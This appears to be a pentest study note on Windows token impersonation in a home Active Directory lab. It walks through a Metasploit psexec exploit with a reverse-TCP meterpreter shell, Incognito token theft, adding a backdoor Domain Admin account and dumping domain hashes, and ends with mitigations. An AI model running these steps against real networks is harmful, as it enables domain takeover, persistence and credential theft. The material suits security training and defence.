# Token Impersonation

- The attacker has compromised a Windows host (via RCE, stolen creds, or lateral movement) and escalated to local administrator or SYSTEM privileges. The goal is to leverage Windows tokens left behind by logged-in users, especially privileged ones like Domain Admins, to impersonate them and escalate privileges across the domain.
- Windows uses access tokens to represent the security context of a process or user. A token defines what the account can access (files, services, network resources). When a user logs in, Windows creates a token that gets attached to their processes. If an attacker can steal or impersonate a token, they can act as that user.

**Types of Tokens**

- **Delegation Tokens**: created when a user logs in locally or via Remote Desktop. They can be used to authenticate to remote services.

- **Impersonation Tokens**: created when a user accesses a resource remotely (e.g., via SMB). They are usually limited to local usage but can sometimes still be abused.

## What can go wrong?

If a Domain Admin token exists on the compromised machine:

- The attacker can impersonate the Domain Admin, without ever stealing or cracking their password.

- This access allows:
  - Dumping domain hashes.
  - Running remote commands (e.g., creating a new backdoor domain account).

**Essentially, all thatâ€™s required is that the Domain Admin logged in once, and their token is still available.**

## Requirements to Impersonate

- Attacker must already have administrator or SYSTEM privileges on the machine to manipulate tokens.

- A privileged user (like a Domain Admin) must have an active or cached token on the compromised system.

## Attack Walkthrough

1. Gain Access

Exploit a target system (example: THEPUNISHER) using valid creds with PsExec:

```
msfconsole

search psexec
use exploit/windows/smb/exec

set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.0.2.16
set SMBUser fcastle
set SMBPass Password1!
set SMBDomain MARVEL.local
run
```

2.  Load Incognito & Enumerate Tokens

(here I logged in with the domain admin account on THEPUNISHER machine to simulate the attack scenario we described)

```
load incognito
list_tokens -u
```

```{figure} ../../../_static/AD/token-imper1.png

3. Impersonate a Token

```
impersonate_token MARVEL\\fcastle
shell
whoami
# => marvel\fcastle
```

Revert back to our original token if needed:

```
rev2self
whoami
# => NT AUTHORITY\SYSTEM
```

Grab the admin token:

```
impersonate_token MARVEL\\administrator
shell
whoami
# => marvel\administrator
```

```{figure} ../../../_static/AD/token-imper2.png

Now we have full Domain Admin privileges.

4. Persistence via New Admin Account

```
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

5. Verify Priveleges

```
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@10.0.2.18
```

```

## Mitigations

- Restrict Token Creation: limit which users/groups can create delegate/impersonation tokens.
- Account Tiering: Domain Admins should only log into Domain Controllers, never workstations/servers. Use separate accounts for daily tasks.
- Local Admin Restriction: minimize the number of local admins and apply LAPS (Local Administrator Password Solution) for unique passwords.
